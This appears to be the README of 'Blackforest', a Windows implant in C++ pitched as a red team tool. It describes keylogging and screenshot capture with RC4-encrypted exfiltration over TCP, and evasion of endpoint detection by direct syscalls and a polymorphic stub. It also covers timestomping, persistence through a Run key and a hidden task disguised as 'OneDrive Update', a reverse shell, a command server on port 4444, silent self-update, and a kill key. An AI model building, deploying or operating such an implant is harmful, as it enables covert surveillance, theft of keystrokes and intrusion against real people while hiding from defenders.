# 🌲 Blackforest: Advanced Red Team Implant

> **⚠️ DOCUMENTATION LEVEL: DEEP TECHNICAL**
> **DISCLAIMER**: For Authorized Red Teaming & Educational Research ONLY.

## 1. Executive Summary
**Blackforest** is a C++ implant engineered for **Evasion**, **Persistence**, and **Silent Exfiltration**. It features a custom **Polymorphic Engine**, **RC4 Network Encryption**, and **Anti-Forensics** capabilities.

## 2. Technical Architecture (Deep Scan)

### A. Evasion & Anti-Analysis
1.  **Direct Syscalls (Hell's Gate Variant)**:
    *   **Logic**: Parses `ntdll.dll` exports mentally to find Syscall IDs.
    *   **Execution**: Executes raw assembly (`syscall`), bypassing user-mode EDR hooks.
    *   **Source**: `include/core/evasion/syscall_hook.hpp`.

2.  **Polymorphic Stub**:
    *   **Engine**: Generates unique "junk" assembly stubs and JIT-decrypts function pointers (`XOR 0xDEADBEEF`) to defeat static signature analysis.
    *   **Source**: `include/obfuscation/polymorphic.hpp`.

3.  **Timestomping (Anti-Forensics)**:
    *   **Logic**: The agent clones the Creation/Write timestamps of `C:\Windows\explorer.exe` onto itself.
    *   **Effect**: Hides `Blackforest.exe` from "Sort by Date" forensic searches.
    *   **Source**: `src/core/evasion/timestomp.cpp`.

### B. Persistence (Redundant)
The agent uses multiple survival mechanisms:
1.  **Registry**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> `BlackforestUpdater`.
2.  **Scheduled Task (Backup)**: Creates a hidden task named `OneDrive Update` that runs Daily. If Registry is wiped, this restores access.
3.  **Process State**: Runs as `DETACHED_PROCESS` (No Window).

### C. Networking (Encrypted)
*   **Encryption**: All TCP traffic (Keylogs, Screens) is encrypted with **RC4 Stream Cipher**.
    *   Key: `DE AD BE EF CA FE BA BE` (Hardcoded/Obfuscated).
*   **Protocol**: Stream-based. Wireshark sees only high-entropy garbage.
*   **Resilience**: Self-healing socket connection.

---

## 3. Deployment (Passwordless)
Automated CI/CD Pipeline:
```bash
scripts/setup_ssh.sh # Run ONCE to setup keys
scripts/build.sh     # Compiles & updates hash
scripts/deploy.sh    # Deploys via SCP (No Password)
```
*   **Auto-Update**: Running `build.sh` updates the binary on the server. Agents confirm the new hash and upgrade themselves silently.

---

## 4. Operational Guide (Team Server)
Unify all operations:
```bash
python3 c2/server.py
```
*   **Port 4444**: Data Stream (RC4 Encrypted).
*   **Port 4445**: Reverse Shell.
*   **Port 8000**: Update Server.

**Commands**:
*   `list`: Active sessions.
*   `interact <ID>`: Enter shell.

---

## 5. Emergency: Remote Kill Switch
To Wipe All Agents:
1.  Edit `update.txt`.
2.  Paste **Kill Key**: `09827a801ea931cdacf6ee8828b3283add9e694764a8c0aea06f73b9eed66d22`
3.  **Wait 60s**: Agents will self-destruct (Delete Binary + Registry + Task).

---

## 6. Visual Architecture

### Agent Lifecycle

```mermaid
graph TD
    Start["🚀 Start"] --> Init["🛡️ Anti-Debug"]
    Init --> Time["🕒 Timestomp"]
    Time --> Persist1["🔑 Registry Key"]
    Persist1 --> Persist2["📅 Scheduled Task"]
    
    Persist2 --> Threads["🧵 Spawn Threads"]
    
    Threads --> Keys["⌨️ Keylogger"]
    Threads --> Screen["🖥️ Screenshot"]
    
    Keys --> RC4["🔒 RC4 Encrypt"]
    RC4 --> Net["🌐 TCP Send"]
```


*🌲 Navigate the forest. Remain unseen. 🌲*
